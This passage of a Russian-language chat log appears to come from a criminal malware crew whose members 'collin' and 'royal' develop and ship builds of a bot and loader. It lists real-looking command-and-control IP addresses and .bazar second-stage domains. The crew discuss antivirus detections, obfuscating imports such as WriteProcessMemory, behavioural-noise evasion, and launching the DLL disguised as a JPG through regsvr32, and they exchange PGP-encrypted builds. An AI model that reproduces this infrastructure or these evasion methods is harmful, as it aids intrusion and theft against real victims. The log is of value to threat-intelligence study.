                        else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {// System Integrity
                            ProcessIntegrityLevel = "System Integrity Process";
                        }
                    }
                    theapFree(&pTIL);
                }
            }
        }
        kernel32CloseHandle(hToken);
    }
}
```
[02.09.21 07:25:50] collin:		```
В отработке команды Get SystemInfo добавдена запись
if (ProcessIntegrityLevel.length()) {
        s += _STR("IntegrityLevel=");
        s += ProcessIntegrityLevel;
        s += "&";
    }

Получен ответ:

os:    
1:    W100
2:    9200
3:    30
IntegrityLevel:    Medium Process
domain:    WORKGROUP
arch:    64
...
```
[02.09.21 07:48:53] collin:		сделай сборки: группы 19 и 20
[02.09.21 07:49:04] collin:		x64, regsvr32
[02.09.21 07:49:19] collin:		адреса и базары:
[02.09.21 07:49:21] collin:		```
адреса (домены) первого этапа
бот:
164.90.198.57
164.90.198.61
164.90.198.79
164.90.198.77

лоадер:
164.90.198.79
164.90.198.61
164.90.198.77
164.90.198.57

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[02.09.21 07:49:28] collin:		направь wild, мне продублируй 19
[02.09.21 09:20:58] collin:		сделай еще сборку группа 31
[02.09.21 09:21:07] collin:		тот же формат и адреса как для 19,20
[02.09.21 09:21:10] collin:		направь wild
[02.09.21 11:24:07] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/9GK2e8ghHmDiLU5b7fgXrh0KGIYtO351BMCR1C5v0IleX
u7pg10ciRGymlRr/Cl/ErH4vKYm6yIPicyjBKCK/VjcpfVnAZVLJFKQgHBITEAIT
oM3nqQfkU9gUSHUZI/2aIyAgnD2HUUulpxxoyd375MjHmAtwmB7pf12g2iap7Xq0
TFQlUVsgQBOQUWS//3ysbhNIDezXyanQAd7tWWeK8z6ReNCw6dhJuDcgrdqgSSEm
gpxrtfQT9hVp5ajQES5ItBn5eRygEejp8dIU6IMM2Q+9ctY+kyw2BLOhJqKbRLmf
qlqSN2Oq3YYxojX7oQN6REbIB6t+QDemSaQTSuDW/o1Im3329JBDMfbguwRmByYV
px+9S2g/nLeVYLTrMhZO0l2vZeDHcu2L8Cff2oEy+tP3Rd69e+EHsur1qUrKqMMP
Bszzy+MsvKh1t0Zf1pHve7gd3o2+Yu+oUl7x4TQXIaRYz4Zv+6xQCUJoRlda1YRS
+oGXaTU4Ki7QFrtucuXpWdmCFvjLYJhVGY7kir68CbUgu+dM7eBG196Jlscq1Pe6
jnowx4uQ61ZKtQYDM73IJyI1er1PhLucBVCgujqW0Hp2v8Un70tfpBPnLilVuRtw
5N0krZN6z9oq0uxhWtdjx9Y7tifVTJea2ZqhtMT/bC/b5j38MUFDNGwNxzIbSVfS
wD0BYacZbpbN3SEeYZsVOoRJpR2OqsoK9L4azjNwzZ3kHWkwPipbm74efK5besIg
RGdYweKPRlqxEU6tJgAy20f2Wnt7CGu9sXg//uVzHPnRWpb9nT6RKYBaUTVjfoV7
3NW1dxkBsBVG6fShKNS5+t4n+25+LsvoVptEVaxTpbiuO7n+fl7YVwIEaCBjTpLy
xaUYpdKyv1NECSZFou8C6yqZgrSt1aO4y9foQKAFAkxElKdoHUCMlbcctO755iNE
8Mo2sTIK30rDgNU6OpwKC1YWUFTRevxBuUdul6yAeHDxLRW476Qp9ZWEF62Ro0iM
1eVAL9XmJjh/gD7wI38H
=VVk/
-----END PGP MESSAGE-----
[02.09.21 11:24:13] royal:		Один детект NOD 32.
[02.09.21 11:26:06] collin:		+
[02.09.21 14:01:09] collin:		```
(07:17:30) admin: 
запуск не менялся 
(07:17:38) admin: 
с тех пор как я в последний раз отвечал 
(07:17:59) admin: 
regsvr32 path/file.jpg 
```
[02.09.21 14:01:16] collin:		наши заказчики по группе 19
[02.09.21 14:01:27] collin:		при этом в последнем прогрузе cmdline=file.jpg
[02.09.21 14:01:46] collin:		вообщем говорят ничего с процессом не делают, не подменяют
[02.09.21 14:01:59] collin:		почему еще может быть что командная страка так определяется?
[02.09.21 14:02:11] royal:		крипт может.
[02.09.21 14:02:38] collin:		вариант отметаем - тот же крипт запускаем на тестовом стенде - там садится корректно
[02.09.21 14:02:40] royal:		там строка берется штатным способом geycmdlinw
[02.09.21 14:02:54] royal:		getcommandlinew
[02.09.21 14:03:06] royal:		и никак не меняется потом
[02.09.21 14:03:49] royal:		он закреплнен?
[02.09.21 14:05:08] royal:		g_cmdline = KERNEL32->getCommandLineW();
[02.09.21 14:06:25] collin:		я смотрел на новых ботах значит запуск изначальный а не из закрепа
[02.09.21 14:07:28] royal:		Через какое то время если перезапускается всегда отосылает сообщение Version
[02.09.21 14:08:13] royal:		Если его запускают через regsvr32 там командная строка не имеет значения у меня, считается что функция для запуска из закрепа DllRegisterServer.
[02.09.21 14:08:40] royal:		А имя утилиты которая запустила тоже не из командной строки берется.
[02.09.21 14:09:10] royal:		Смотрит на имя regsvr32 значит DllRegisterServer даже не разбирает командную строку никак.
[02.09.21 14:09:20] royal:		Разбирает только если утилита rundll32
[02.09.21 14:11:22] royal:		Еще вариант проверить, дать команду getsysteminfo и посмотреть командную строку.
[02.09.21 14:12:01] collin:		`
Еще вариант проверить, дать команду getsysteminfo и посмотреть командную строку. ` - так я об этом и говорю он здесь неправильно показывает
[02.09.21 14:12:25] collin:		знаю ты поправил все что нашли, но эта ситуация может еще на что-то влиять что не выявили пока
[02.09.21 14:12:44] collin:		вчера например новым стабом криптавали, в тестах крипты работали норм а у них в прогрузе не пошли
[02.09.21 14:12:51] collin:		почему  непонятно, возможно с этим связано
[02.09.21 14:13:58] royal:		А ини там не запускают типа как крипт внутри крипта?
[02.09.21 14:14:30] royal:		Тогда командная строка будет та что у самого первого.
[02.09.21 14:14:30] collin:		непонятно, не говорят ничего
[02.09.21 14:14:36] collin:		пытаюсь выудить от них инфу
[02.09.21 14:16:28] royal:		Это только у меня так?
[02.09.21 14:17:08] collin:		непонятно, пока только твою сборку с ними работаем
[02.09.21 14:19:18] royal:		А если сделать команду загрузить файл на сервер, и указать тот самый путь с jpg
[02.09.21 14:19:32] royal:		И сравнить с криптом.
[02.09.21 14:20:27] royal:		Тогда будет понятно нахимичили чего сверху или нет.
[02.09.21 14:21:35] collin:		это мысль, попробую
[02.09.21 14:23:16] royal:		А если команда не прокатит, посмотрим по коду ошибки, что там.
[02.09.21 15:41:34] collin:		с боевым ботом ситуация не исправилась
[02.09.21 15:41:37] collin:		с коннектом через базары
[02.09.21 15:41:50] collin:		в bd2_x64_19_386.exe - как раньше, процесс крутится UDP запросы идут
[02.09.21 15:41:56] collin:		в логированном опять все чотко
[02.09.21 15:42:06] collin:		ты усебя проверял именно боевой, он коннектился?
[02.09.21 15:42:15] royal:		Да.
[02.09.21 15:43:08] collin:		непонятно тогда
[02.09.21 15:43:11] collin:		сейчас еще раз запущу
[02.09.21 15:43:39] collin:		я так делаю: на ВМ с брандмауере виндовс ставлю адреса 1 шага текущие в черный список, запускаю бота
[02.09.21 15:43:55] collin:		жду 12 минут, потом должен базар находить
[02.09.21 15:46:00] royal:		Посмотрю сколько времени надо ждать. Я проверял сразу генерацию.
[02.09.21 15:46:26] collin:		ты проверь именно в боевом, может частичный вариант работает
[02.09.21 15:46:38] collin:		а в целом что-то не так
[02.09.21 15:54:58] royal:		Запрос не прокатывает для получения ближайших dns серверов.
[02.09.21 15:55:36] royal:		Может сервис не работает на данный момент.
[02.09.21 15:55:47] royal:		В браузере тоже не прокатывает его сделать.
[02.09.21 15:55:59] royal:		Вот и не резолвиться ничего.
[02.09.21 15:56:49] royal:		Вот такой https://api.opennicproject.org/geoip/?bare&ipv=4&wl=all&res=8
[02.09.21 15:57:46] collin:		этот запрос отбрасывает адреса с черным списком?
[02.09.21 15:58:09] royal:		Только белый список wl=all параметр
[02.09.21 15:58:30] collin:		`Please wait a reasonable amount of time between queries!` - видимо с моего впн много запрсов шло
[02.09.21 15:59:17] royal:		У меня заработал сейчас.
[02.09.21 15:59:54] royal:		Должно работать, если запрос что яписал выше прокатывает.
[02.09.21 16:00:44] royal:		Я ушел.
[03.09.21 08:59:22] collin:		какой у тебя алгоритм действий если запрос получения днс-серверов не работает
[03.09.21 08:59:27] collin:		вот этот `https://api.opennicproject.org/geoip/?bare&ipv=4&wl=all&res=8`
[03.09.21 08:59:57] collin:		сколько попыток коннекта к нему, с какими интервалами, есть ли резервные днс-сервера хардкодные - если он не ответит?
[03.09.21 09:00:38] collin:		есть ли проверка того что он прислал - валидные адреса или текст об ошибках
[03.09.21 09:00:40] royal:		Никакокй. ичего не сможет разобрать, пойдет по новой по спискам, дойдет до базар, опять запросит сервера dns. Так 3 раза по всем спискам.
[03.09.21 09:01:06] collin:		т.е. если не получил ответ - 3 шаг не проходит?
[03.09.21 09:01:32] royal:		Проходит в холостую.
[03.09.21 09:01:39] collin:		так не годится(
[03.09.21 09:02:14] royal:		Можно добавить пару заранее отобранных адресов dns
[03.09.21 09:02:21] collin:		подобный сервис с которого список днс-сервов можно получить
[03.09.21 09:02:23] royal:		Но гарантии их работы не будет
[03.09.21 09:02:28] collin:		один или есть другие?
[03.09.21 09:02:41] royal:		Они могут не работать в одном месте, и работать в другом.
[03.09.21 09:02:52] collin:		`Но гарантии их работы не будет` - почему?
[03.09.21 09:03:09] royal:		Типа в росии резолвит: в вдругой стране нет.
[03.09.21 09:03:10] collin:		как раз здесь гарантия и есть - подпираешь адреса, проверяешь, раз в неделю список актуализируешь
[03.09.21 09:03:23] royal:		По этому и делаю запрос на ближайшие по ip.
[03.09.21 09:03:40] collin:		а были такие случаи?
[03.09.21 09:03:53] collin:		чтобы не работало в одной стране и работало в другой
[03.09.21 09:04:03] royal:		Конечно, некоторые прокдаки даже у меня не работали из России
[03.09.21 09:04:23] royal:		Типа не могу найти сервер
[03.09.21 09:04:47] royal:		Надо взять по ip из США пару адресов
[03.09.21 09:04:53] collin:		тогда их надо под US адресом чекать
[03.09.21 09:05:04] royal:		Тогда вероятность намного выше будет я думаю.
[03.09.21 09:05:14] royal:		И 8 запросом как сейчас, всего 10.
[03.09.21 09:11:42] collin:		ты одну попытку запроса делаешь к нему?
[03.09.21 09:13:06] royal:		Одну каждый разперед тем как начать резолвить базар.
[03.09.21 09:17:36] collin:		а по каким признакам определяется - будет днс-серв работать с текущего адреса или нет
[03.09.21 09:17:38] collin:		не известно?
[03.09.21 09:18:05] royal:		Запрос послать
[03.09.21 09:18:35] royal:		Получить ошибку в ответ.
[03.09.21 09:18:49] collin:		ну это понятно
[03.09.21 09:19:02] collin:		а общих признаков нет ли
[03.09.21 09:19:11] royal:		Это же еще от оператора интернета может зависить.
[03.09.21 09:19:22] collin:		например если сервер помечен ns8.fr.dns.opennic.glue - типа он только для франции
[03.09.21 09:19:27] royal:		тут 100 процентов быть не может
[03.09.21 09:22:03] royal:		Ты его получил запросом?
[03.09.21 09:22:24] collin:		это на сайте в списке
[03.09.21 09:22:27] collin:		https://servers.opennicproject.org/
[03.09.21 09:22:30] royal:		Там можно в запросе параметром указывать ip к которому ближайшие сервера получать.
[03.09.21 09:22:46] royal:		Не обязательно свой ip использовать.
[03.09.21 09:23:09] royal:		Так можно из США и взять.
[03.09.21 09:23:18] collin:		известно что не все сервы работают с базарами
[03.09.21 09:23:40] collin:		вот из этого списка которые по геоип дает - сколько резолвит базары всреднем, не проверял?
[03.09.21 09:23:58] collin:		и нет ли там параметра "дать только сервы, которые резолвят базары"?)
[03.09.21 09:24:07] royal:		Да некоторые не резолвят, они удаляются из списка по коду ошибки.
[03.09.21 09:24:38] royal:		Максиму что было за все время это 2 из 8 не резолвили.
[03.09.21 09:25:26] royal:		Параметра нету такого "дать только сервы, которые резолвят базары"
[03.09.21 09:26:14] royal:		При первом резолве первого адреса все становиться ясно и они удаляются из списка и больше не используются, после этого скорость резолва резко возрастает.
[03.09.21 09:26:49] collin:		т.е. ответ идет не просто что запись не найдена, а именно что формат домена не поддерживается?
[03.09.21 09:27:29] royal:		Да там же коды ошибок DNS есть.
[03.09.21 09:28:04] royal:		status == ERROR_TIMEOUT || status == DNS_ERROR_RCODE_SERVER_FAILURE
[03.09.21 09:28:17] royal:		По этим кодам удаляю из списка.
[03.09.21 09:28:23] collin:		ок
[03.09.21 09:28:57] royal:		status == DNS_ERROR_RCODE_NAME_ERROR
[03.09.21 09:29:26] royal:		По этому коду сразу понятно что нету такого и дальше не иду по списку.
[03.09.21 09:29:34] royal:		status == DNS_RCODE_NOERROR
[03.09.21 09:29:46] royal:		Этот код успех.
[03.09.21 09:37:21] collin:		сделай сборки - группы 19 и 31
[03.09.21 09:37:29] collin:		x64, regsvr32
[03.09.21 09:37:34] collin:		адреса и базары:
[03.09.21 09:37:40] collin:		```
адреса (домены) первого этапа
бот:
89.41.182.134
172.83.155.144
194.15.113.160
198.244.180.69

лоадер:
194.15.113.160
198.244.180.69
89.41.182.134
172.83.155.144

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[03.09.21 09:37:46] collin:		направь wild
[03.09.21 09:49:04] collin:		насчет днс-серверов - добавил таск 570
[06.09.21 14:06:55] collin:		привет!
[06.09.21 14:07:13] collin:		скинь мне утилиту "get_id_bk" для своих сборок, актуальную
[06.09.21 14:07:17] collin:		есть такая?
[06.09.21 14:13:16] royal:		Привет.
[06.09.21 14:13:16] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ//Y3MqzN3BFQaPu8GE/XgqrTkwuvSFxYDJ4SlpfQfP1NPf
RdD8bim9Ba+PNGJFfVF1sahHX4uChd1UlJZlWhbxkHOnjpSYYXYXljV26XdNmdlt
wHNsiaHh8G7ZApgwpncMgeVLzy7zosnCVkrrQblJX5vxPKDOuFUwTXQmLQgr3dqM
C1jpSKGWv3LiJbcv6ZkFgYntbtVgmAsWHnD9EgsApjyE0FyiNVlYrDiQ7NVq5lVN
tyQDHl2AUWTm+Dou4442qHPnca8GtxqMe7FXZXp2KoGlwTWNLEZV0MYYHmDJnRKp
L7LtqbISyeBrZFWcsN36T+fK5RSQaSLjxQxyXu0RnWKlJvFAjyEbJDIiGwygzR43
ElJO6pfR9ZLGLzKkrBnqOkwa76ZC9T/305LnkMZSvOcrWZh/IsXF0+oCFrmLoATn
hNawReYZaRisVFECi/5CO0khSLOLNgXhsBcgkNpmtqBWDfI7Or2hGGSRIsL09AVb
b1ubby0XwihDexdIZB+jb4ltTlafCRAasdaL4XVQweMyQs7SBD8EgVhGl/cQNdew
IwKdRRBjuKUHDXTvifJLS+rQ5cuu/DHVIEEMWkngSpipHE5Ppnb1E6Vpyn7dN7XJ
pxvGPQr2Pd/hSo/NzgUchHKn5JYiRoFOO20WrFbZHNqUsR3yOdJXvS6RKQb1eQ/S
rgHiUatqIVElDRcYp6W1TWb7IGrM8W9sblHfyFnCPVuv33B43SiUUILhvY4QfLtr
EBwATzKjUZB+UCJts2DjcqoH69g2dvxmwgtOAhH5dLXTvbyAS/LGnXVo39IpjRca
UqIALvzfMZmBf+VVkIcaQlHoj0Ic61MaefHtMIS9J+85BeDEhCIB9vOEnt1fHAGh
sIdDiDWr9651ur5VINPvxMUc7JzbJ/AxPZynpwXhRQ==
=9uaH
-----END PGP MESSAGE-----
[06.09.21 14:28:13] collin:		+
[07.09.21 07:13:35] collin:		привет!
[07.09.21 07:13:41] collin:		сделай сборку группа 20
[07.09.21 07:13:47] collin:		x64 regsvr32
[07.09.21 07:13:49] collin:		адреса и базары:
[07.09.21 07:13:56] collin:		```
адреса (домены) первого этапа
бот:
89.41.182.134
172.83.155.144
194.15.113.160
198.244.180.69

лоадер:
194.15.113.160
198.244.180.69
89.41.182.134
172.83.155.144

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[07.09.21 07:13:59] collin:		направь wild
[07.09.21 08:52:46] collin:		как успехи по группе 20?
[07.09.21 08:53:10] royal:		Делаю.
[07.09.21 08:53:31] collin:		детекты?
[07.09.21 08:54:27] royal:		Пока убрал.
[07.09.21 08:56:04] royal:		Адреса не изменились?
[07.09.21 08:56:13] royal:		У меня такие есть.
[07.09.21 08:56:33] collin:		да адреса те же от 03.09
[07.09.21 10:03:26] collin:		что-то сломалась сборка группа 19 от 03.09
[07.09.21 10:03:32] collin:		на все запросы 404 ответ сервера
[07.09.21 10:04:04] collin:		ключи не могли слететь в админке?
[07.09.21 10:04:30] collin:		в лоадере, до бота не доходит
[07.09.21 10:20:45] collin:		сделай группу 19 новую сборку
[07.09.21 10:20:52] collin:		x64 regsvr32
[07.09.21 10:21:11] collin:		адреса и базары те же
[07.09.21 10:21:25] collin:		```
адреса (домены) первого этапа
бот:
89.41.182.134
172.83.155.144
194.15.113.160
198.244.180.69

лоадер:
194.15.113.160
198.244.180.69
89.41.182.134
172.83.155.144

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar

```
[07.09.21 10:21:39] collin:		направь wild
[07.09.21 10:21:48] collin:		и выясни почему сломалась от 03.09 версия 389
[07.09.21 10:24:48] collin:		https://file.io/HIwFthFuQUep
[07.09.21 10:24:56] collin:		лог работы лоадера 389 версия
[07.09.21 10:34:06] royal:		Сломалась потому что баг там был после чистки я думаю, который приводил к генерации строки заголовков запроса с ошибками.
[07.09.21 10:34:21] royal:		По этому 404
[07.09.21 10:37:11] collin:		понятно, ее не работали еще видимо изначально так было
[07.09.21 10:38:05] royal:		Изначально.
[07.09.21 10:38:22] royal:		Это вскрылось на следующей же сборке.
[07.09.21 10:38:25] royal:		На 390.
[07.09.21 11:12:25] collin:		дай мне инфу по своему боту БК:
[07.09.21 11:12:38] collin:		1) используется ли crt-пролог (winCRTmain или подобная точка входа)
2) есть ли статический импорт кроме kernel32.dll 
если есть как используется - реально в работе или только для шума по статике 
и какие еще dll есть в импорте 
3) текущее состояние бота по статике - результат проверки на динчек 
4) есть ли профиль сборки с помощью llvm
[07.09.21 11:16:37] royal:		1 - Да
2 - Да. Реально используется.
3 - MSVC - https://dyncheck.com/scan/id/6e0ecf59e4c5562c2db05a89b4b9d621
     Clang - https://dyncheck.com/scan/id/0a2bd5d11650b34a16b3fb225dde30d4
4 - Да.
[07.09.21 11:17:26] collin:		2 - какие еще либы?
[07.09.21 11:18:11] royal:		Импорт:
kernel32.dll
ntdll.dll
oleaut32.dll
shlwapi32.dll
user32.dll
version.dll
[07.09.21 11:23:29] collin:		и вызовы из них не обфусцированы?
[07.09.21 11:24:40] royal:		По поводу командной строк. Сделаю так. Если в командной строке будет один аргумент, то смотрю на имя утилиты если regsvr32 экспортная функция считается DllRegisterServer, если rundll32 StartW. Если больше одного аргумента то по старому парсю командную строку если имя утилиты запустившей rundll32.
[07.09.21 11:25:01] royal:		То что из импорта там безобидные функции
[07.09.21 11:25:13] royal:		Вызовы их не обфусцированны.
[07.09.21 11:25:44] royal:		Типа HeapAlloc StrStr lstrcpy и т.д
[07.09.21 11:26:15] royal:		Всякие CreateFile WriteProcessMemory и подобные конечно обфусцированны.
[07.09.21 11:27:04] collin:		насчет командной строки видел вчера в delivery совет нам дали?
[07.09.21 11:27:19] royal:		Это не нам а тем кто запускает.
[07.09.21 11:27:27] collin:		нам для парсинга же
[07.09.21 11:27:32] collin:		им все равно как запускать)
[07.09.21 11:27:49] royal:		Вот я написал выше как поступить.
[07.09.21 11:28:05] royal:		Тогда все равно как они запускают.
[07.09.21 11:28:21] royal:		Имя утилиты берется и так не из командной строки
[07.09.21 11:28:35] royal:		в regsvr32 обязана быть DllRegisterServer
[07.09.21 11:29:01] royal:		Если запущен через regsvr32 то и парсить не нужно командную строку.
[07.09.21 11:29:19] royal:		А из закрепа будет запущен правильно уже.
[07.09.21 11:29:21] collin:		`Если в командной строке будет один аргумент` - может быть два при запуске через rundll32 - пробелы там добавлены типа "rundll32 file.dll , Entry"
[07.09.21 11:29:43] royal:		Это не верный запуск.
[07.09.21 11:30:00] collin:		при первичном запуске может так быть же
[07.09.21 11:30:08] collin:		и вооще без запятой может быть, так тоже работает
[07.09.21 11:30:29] royal:		Я написал если один аргумент я считаю это ошибкой и смотрю на имя утилиты.
[07.09.21 11:30:47] royal:		Если больше одного и имя утилиты rundll32 парсю по старому.
[07.09.21 11:31:01] royal:		Если ошибка в парсинге по умолчанию StartW
[07.09.21 11:32:04] royal:		В ковычках ты написал это как один аргумент считается.
[07.09.21 11:32:34] royal:		Я ошибся. Фигню написал.
[07.09.21 11:32:57] royal:		Короче парсю тольео если больше 1 аргумента и имя утилиты rundll32
[07.09.21 11:33:19] collin:		``Если больше одного и имя утилиты rundll32 парсю по старому.`` - плюс надо учесть если первый аргумент не имя rundll32.exe в любом формате (краткое, полное, с путем или без) - то считаем первым аргументом имя файла
[07.09.21 11:33:32] collin:		так?
[07.09.21 11:35:13] royal:		Сначала проверка на количество, потом проверка на имя утилиты из командной строки, и только потом прасинг, если имя утилиты.
[07.09.21 11:35:43] royal:		Что может быть file.jpg one two three у них?
[07.09.21 11:36:18] royal:		Тут получиться имя утилиты regsvr32 не парсю вообще,
[07.09.21 11:36:40] royal:		Имя утилиты regsvr32 сравниваю с file.jpg, не парсю вообще.
[07.09.21 11:38:13] royal:		В их случае 19 группы не парсю вообще будет всегда.
[07.09.21 11:38:53] royal:		А из закрепа уже нормально будет запускаться, тогда парсю.
[07.09.21 11:39:14] royal:		Из закрепа будет больше 1 аргумента.
[07.09.21 11:39:52] collin:		ок
[07.09.21 11:40:49] royal:		Кстати кошгда парсю, когда больше 1 аргумента я первый вообще не использую, подразумевается что это имя утилиты запустившей.
[07.09.21 11:41:10] royal:		Шаг с проверкой имени из аргумента 0 не нужен.
[07.09.21 11:41:19] royal:		Все проще.
[07.09.21 12:44:17] collin:		а ты используешь шумовую активность в лоадере?
[07.09.21 12:47:37] royal:		Шумовая активность это левые вычисления?
[07.09.21 12:48:37] collin:		да, в противовес простою по Sleep - вычисления, работа с памятьюя и тд
[07.09.21 12:48:42] collin:		я довал образец
[07.09.21 12:48:52] collin:		смотрю он в коде есть у тебя но все выходы на него закомментированы
[07.09.21 12:49:02] royal:		Да.
[07.09.21 12:49:05] collin:		полиморфизм по поведению назывался
[07.09.21 12:50:20] royal:		Сейчас конкретно отключен.
[07.09.21 12:50:40] royal:		Не проверял с ним на детекты после чистки.
[07.09.21 12:50:49] collin:		надо сделать, под себя заточи если мой не подходит
[07.09.21 12:51:05] collin:		потом надо будет в боте тоже - сейчас ТЗ сочиняю
[07.09.21 12:51:26] royal:		В боте тоже есть.
[07.09.21 12:51:27] collin:		ты всю неделю чисткой занимался?
[07.09.21 12:51:32] royal:		То же самый.
[07.09.21 12:51:35] royal:		Да.
[07.09.21 14:11:28] royal:		Парметр integrity level все рвно как называть в ответе на GetSystemInfo?
[07.09.21 14:11:37] royal:		lvl пойдет?
[07.09.21 14:11:55] royal:		&lvl=Low Integrity Level например.
[07.09.21 14:13:21] royal:		Тест.
[07.09.21 14:13:27] royal:		Парметр integrity level все рвно как называть в ответе на GetSystemInfo?
lvl пойдет?
&lvl=Low Integrity Level например.
[07.09.21 14:14:32] collin:		`IntegrityLevel` - делай так пока
[07.09.21 14:15:00] royal:		Регистр имеет значение?
[07.09.21 14:15:13] royal:		У меня все маленькими буквами.
[07.09.21 14:15:20] collin:		делай маленькимиъ
[07.09.21 14:15:23] royal:		integritylevel
[07.09.21 14:15:26] collin:		да пойдет
[07.09.21 14:15:32] royal:		OK.
[08.09.21 08:38:16] collin:		привет!
[08.09.21 08:38:18] collin:		сделай сборки
[08.09.21 08:38:23] collin:		группы 19 и 20
[08.09.21 08:38:28] collin:		x64, regsvr32
[08.09.21 08:38:34] collin:		адреса и базары:
[08.09.21 08:38:40] collin:		```
адреса (домены) первого этапа
бот:
94.158.245.52
94.140.114.61
167.172.37.9
64.225.71.166

лоадер:
167.172.37.9
64.225.71.166
94.158.245.52
94.140.114.61

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[08.09.21 08:38:47] collin:		направь wild
[08.09.21 08:38:57] collin:		19 мне продублируй
[08.09.21 09:31:43] royal:		Вчерашние сборки лусше не пускать в работу, я еще нашел баг с заголовками.
[08.09.21 09:32:14] collin:		20 группу прогружали уже..
[08.09.21 09:32:17] collin:		а что там?
[08.09.21 09:33:12] royal:		Как повезет будет, там в зависимости от строки с подписью может не верно экранироваться символы +/=
[08.09.21 09:33:29] collin:		несколько ботов пришло
[08.09.21 09:33:46] royal:		если подряд будет идти например +/ получиться %2B%2B а не %2B%2F
[08.09.21 09:34:54] royal:		Везет пока значит, как дата измениться а соответственно и подпись может и не прийти будет 404. Это только в загрузчике баг, так что если он успел без ошибки скачать ботбудет рабоать без проблем конечно.
[08.09.21 09:39:52] royal:		Проверь на прокси то что я пришлю тебе сборку.
[08.09.21 09:40:20] royal:		Или тестировщики умеют это делать?
[08.09.21 09:40:32] collin:		посмотрю, они пока не умеют
[08.09.21 09:47:54] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ//SzLf+z7KsU+9kaJWx1v71C4O8imZO0zQ7Gnosn9thWqS
DZvXfihqTrVgPfUOJ2mtOsX2nd4s/p2i5qz6GgBaXLx8vo7Ez1+xT1G8Dd/MQt17
nuhOp+fUYMlQkvATyKSGGvizWBIZOwDvNUWxPJSE51fleRvVLTpsxzRL635xU0a3
V3MuHxz2BG7N0i/bpUP5RTY3IWbc7TPQnhqACKnT17rZrqwGDNxen3unnNpezOFs
/UgmRDdMs7HvZP05aY6gEB5OFdFzyILlY/suxegcfwz03oWkarTeiig4+i0yh6E7
KssXhXFJfLwnWjcfB21RTHnNHLTI+unr5WBEa8jrJ2/MoP+veK2AbDEfPfZcsB1B
U129vKyHUwbWYcabUTE1rGBySMuu1G5N1KWsw+BgFxMc4Q0Wlwq1g8IcB3CQjB4x
J0RdmrHGKc1EsiJP2GCZr176/4JAkn7paXPFWdxt+XIkNUsLeolbidYqDFJGW2fO
XLauAssLZ8xlYNZuswUYgISLggD3p16Q/JMiznEpN49u/MKoKsmQJik+0otP7f3A
kn2LFtMwxUAiyNEtC91nTE1uQKZcmMb5sO6eKT/uDGx4SoOzUEHvJSBpPU19Gqee
HjLI1LY01WvOd3viWgbAIqzwK2t4zajNXJkQi9tcWGxXj6J4KBI1APGg+xZFYDfS
wD4B8ld/IwS9l8x2+T7wKfvhLWHna5t1BE85PKSSyh1RsUpSObXJkmlGREA8Z5ko
HXj8a6C3YzrWGkqQPP63kqTqGiF87sXM2KhsGYQVw2NGBLPKvkVIGo6ddOy/JZWu
j6nb+Xv3DKKmMRRzn4jvBLpDwfITf6r0HcJ/HUIccJV5AX71XMXW2AkGgdUOK+Dm
TjyYV2Mp2qE9l0xaXLjFJu1o9XCWYE2idnnLIVSZ/Pw6LVhCEJ1C5bGmI7Je23qw
KkMnncHAI5n+FdXrsP68kkuwlRbNpUFi5Tfb/Nv0lu77SvQS4X6Ajhw/aCsVieq5
ktd/yeIyjP5Jlk1r3yBuAg==
=4x4b
-----END PGP MESSAGE-----
[08.09.21 10:19:35] collin:		из какого процесса в лоадере у тебя коннект идет к СС
[08.09.21 10:19:46] collin:		из regsvr32.exe должен?
[08.09.21 10:20:19] royal:		Из того кто запстил.
[08.09.21 10:20:25] royal:		Запустил.
[08.09.21 10:21:39] royal:		Кто загрузил dll из того и идет.
[08.09.21 10:23:50] collin:		ну т.е. если я запускаю командой
[08.09.21 10:23:52] collin:		`regsvr32.exe dl2_x64_19_393.dll`
[08.09.21 10:23:58] collin:		коннект будет из regsvr32.exe
[08.09.21 10:24:00] collin:		так?
[08.09.21 10:24:03] royal:		Да.
[08.09.21 10:24:09] royal:		Получается так.
[08.09.21 10:24:43] collin:		тогда у тебя в лоадере не через прокси идет
[08.09.21 10:24:49] collin:		в боте через прокси
[08.09.21 10:25:26] royal:		Точно. Я парметр там забыл поменять как в боте.
[08.09.21 10:25:57] royal:		Значит работает через прокси, надо параметр один всего поменять когда открываешь интернет сессию.
[08.09.21 10:45:46] royal:		Вот запусти.
-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAqI4167rCZneahYzkuyulxRqoW5iBWmqGN3GoSmLs5bHK
Fal4n+VRlVNEjeTOdFNehgz/fqkDIeA1pYGu1Owbuoj+gYaB/6kweGY/1p9OY3Ki
fHLA2tXhsvPqrC6YPwhTxBJQtXv6aHIQk3+um3MUj1jykk5N5vfDblT5nHHHYoQQ
7yBNntHvlDinxeBzEQMzpoluZAXETbc/B6QsuFGPucJXxfuPcw/EWBNMVD+5SCJo
YsdISAWNdYRphDMcFePNVaZdY3Ai76yN/hjwM+8pkZMBuws4UNs0MzDB2WKL3V8D
tYgZuIeKrN3BRThDhxNIYbBMdvl+tcODf1zfaKt9kq7nRdSeTkLgzMM8oXG8BWJl
uibt1T4SLVI4/q/fpwnd1a8y5rqRxwdQ/f9GQusC0bXNJfJToXwwC1dF1CHaEDJ9
a/IdvKECY5c3WFIxz1Y8NgB+AnH3fds2MrAa+JmW7Fwig9r2q6fRe1x3nSS5PpUf
Sh3s47iT5DSiNSg2eQ9lKuq+pdpY1QBXDAhDanylb7vRvW6qUkxnuHPVpjAoO5rd
N3QS6axXMSdyM4AwWQgpibDAJiAEw3D4Dqf5jbIF7FmWLA12teZqpW681D2ptQxJ
Uk7hags6s93jhZN9LHqnReuGOW0BwX1qwnMtH1Z2P9/PiNn23yjW5lbJStYDWjTS
rgH+GwI2TkzKDX6fEUtM8EbNbLkMJHGG7eNF8Gw9MkUUCyYPjbgwId2azHt9mdTK
